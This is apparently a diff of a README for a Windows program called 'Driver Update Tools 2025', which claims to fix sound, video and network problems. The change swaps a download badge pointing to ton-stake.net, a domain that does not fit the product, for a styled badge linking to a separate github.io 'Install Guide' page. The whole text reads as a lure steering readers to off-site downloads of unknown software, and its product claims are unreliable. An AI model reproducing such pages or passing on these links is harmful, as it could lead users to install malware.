@@ -3,7 +3,11 @@
 **Driver Update Tools 2025** is a Windows utility that automatically scans for outdated or missing drivers.  
 It helps fix sound, video, network, and performance issues on Windows 11/10 PCs.  
 
-[![Download Driver Tools](https://img.shields.io/badge/Download-Driver_Update_Tools_2025-blueviolet)](https://ton-stake.net)
+<a href="https://driver-update-tools-2025.github.io/.github/" target="_blank">
+  <img src="https://img.shields.io/badge/Install_Guide-Now-3498db" alt="Install Guide Now" width="230" height="45" style="border:none;">
+</a>
+
+
 
 ---
 
